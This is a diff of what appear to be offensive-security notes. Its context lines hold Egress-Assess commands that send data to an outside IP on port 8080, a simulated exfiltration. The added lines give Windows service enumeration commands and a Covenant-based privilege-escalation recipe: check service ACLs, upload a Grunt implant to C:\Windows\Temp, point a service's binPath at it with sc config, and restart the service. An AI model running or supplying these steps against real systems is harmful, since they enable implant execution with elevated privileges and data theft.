@@ -16,5 +16,29 @@ PowerShell Invoke-EgressAssess -Client http -DataType ni -IP 10.8.0.x -Port 8080
 https://github.com/FortyNorthSecurity/Egress-Assess
 Egress-Assess.py --server http --server-port 8080
 
+#Servicies windows
+services.msc
+sc query
+Get-Service | Format-List
+
+Weak Service Permissions
+From Covenant:
+SharpUp
+Import PowerShellImport Get-ServiceAcl.ps1
+PowerShell 'SERVICE' | Get-ServiceAcl | Select-Object -ExpandProperty Access
+Upload /filepath:"C:\Windows\Temp\GruntSMB_svc.exe"
+Shell sc config "service" binPath= "C:\Windows\Temp\GruntSMB"
+Shell sc qc "service"
+Shell sc stop "service"
+
+
+
+
+
+
+
+
+
+
 
 
